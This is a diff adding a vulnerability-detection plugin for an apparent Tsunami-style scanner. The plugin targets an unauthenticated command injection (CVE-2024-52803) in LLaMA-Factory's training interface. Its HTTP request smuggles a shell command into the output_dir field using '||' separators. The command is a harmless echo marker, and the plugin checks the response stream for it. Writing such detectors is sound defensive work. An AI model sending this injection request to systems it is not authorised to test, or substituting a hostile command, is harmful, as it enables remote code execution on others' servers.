@@ -1,0 +1,94 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "LlamaFactory_CVE_2024_52803"
+  author: "Mehtab Zafar (mehtabzafar@google.com)"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "LLAMA_FACTORY_OS_COMMAND_INJECTION"
+  }
+  severity: CRITICAL
+  title: "LLaMA-Factory is vulnerable to OS Command Injection / Remote Code Execution"
+  description: "The instance of LLaMA-Factory is vulnerable to unauthenticated OS command injection (CVE-2024-52803). The vulnerability arises from improper handling of user input in the training process where the output_dir value is injected into the Popen function without sanitization. The function is invoked with shell=True, allowing remote attackers to execute arbitrary OS commands."
+  recommendation: "Update to version 0.9.1 or later."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2024-52803"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "join_queue_with_payload"
+  http_request: {
+    method: POST
+    uri: "/queue/join"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"data\":[\"en\",\"Aya-23-8B-Chat\",\"CohereForAI/aya-23-8B\",\"lora\",[],\"none\",\"bitsandbytes\",\"cohere\",\"none\",\"auto\",\"Supervised Fine-Tuning\",\"data\",[\"identity\"],\"5e-5\",\"3.0\",\"1.0\",\"100000\",\"bf16\",2048,2,8,0,\"cosine\",5,100,0,0,\"{\\\"optim\\\": \\\"adamw_torch\\\"}\",false,false,false,false,false,false,false,false,2,\"all\",\"\",8,16,0,0,false,false,false,false,\"\",\"\",0.1,0,\"sigmoid\",null,false,false,false,16,200,0.25,\"all\",false,\"layer\",\"ascending\",50,0.05,\"train_2024-11-21-10-44-30|| {{ payload }} ||\",\"2024-11-20-21-24-26.yaml\",\"none\",false],\"event_data\":null,\"fn_index\":17,\"trigger_id\":126,\"session_hash\":\"{{ session_hash }}\"}"
+    response: {
+      http_status: 200
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "\"event_id\":\"([a-zA-Z0-9_]+)\""
+            variable_name: "event_id"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "retrieve_execution_result"
+  http_request: {
+    method: GET
+    uri: "/queue/data?session_hash={{ session_hash }}"
+    headers: [
+      { name: "Accept" value: "text/event-stream" }
+    ]
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "{{ payload_result }}" }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  variables: [
+    { name: "session_hash" value: "tsunami{{ T_UTL_CURRENT_TIMESTAMP_MS }}" },
+    { name: "payload" value: "{echo,tsunami$((1250+50*2))}" },
+    { name: "payload_result" value: "tsunami1350" }
+  ]
+
+  actions: [
+    "join_queue_with_payload",
+    "retrieve_execution_result"
+  ]
+}
